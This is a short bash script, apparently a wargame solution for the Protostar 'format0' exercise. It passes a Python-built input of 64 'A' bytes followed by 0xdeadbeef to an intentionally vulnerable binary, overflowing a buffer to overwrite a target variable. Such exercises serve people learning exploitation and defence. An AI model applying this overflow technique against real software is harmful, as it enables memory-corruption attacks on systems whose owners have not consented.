#!/usr/bin/bash

/opt/protostar/bin/format0 `python -c 'from struct import pack as p; print "A" * 64 + p("I", 0xdeadbeef)'`
